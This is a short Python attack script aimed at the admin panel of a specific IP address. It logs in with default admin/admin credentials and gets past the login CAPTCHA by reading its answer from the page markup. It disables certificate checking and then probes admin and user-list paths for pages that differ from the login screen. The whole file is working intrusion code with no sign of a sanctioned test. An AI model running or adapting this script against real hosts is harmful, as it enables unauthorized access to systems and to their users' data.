#!/usr/bin/env python3
"""
Try to find actual admin pages after login
"""

import requests
import re

TARGET = "https://210.69.42.55"
sess = requests.Session()
sess.verify = False

# Login
r = sess.get(TARGET + "/admin/login")
token_match = re.search(r'name="_token" value="([^"]+)"', r.text)
if token_match:
    token = token_match.group(1)
    r = sess.get(TARGET + "/admin/captcha")
    captcha_match = re.search(r'<text[^>]*>(\w)</text>', r.text)
    if captcha_match:
        captcha = captcha_match.group(1)
        r = sess.post(TARGET + "/admin/login", data={
            'username': 'admin',
            'password': 'admin',
            'captcha': captcha,
            '_token': token
        })
        
        # Try different admin paths
        paths = [
            "/admin", "/admin/index", "/admin/home", "/admin/main",
            "/admin/users/list", "/admin/user/list", "/admin/users/index",
            "/admin/users?page=1", "/admin/users.json"
        ]
        
        for path in paths:
            r = sess.get(TARGET + path)
            # Compare with login page
            if "admin/login" not in path:
                if "後台登入" not in r.text and len(r.text) != 4759:
                    print(f"[+] {path}: {r.status_code} - Different content! Size: {len(r.text)}")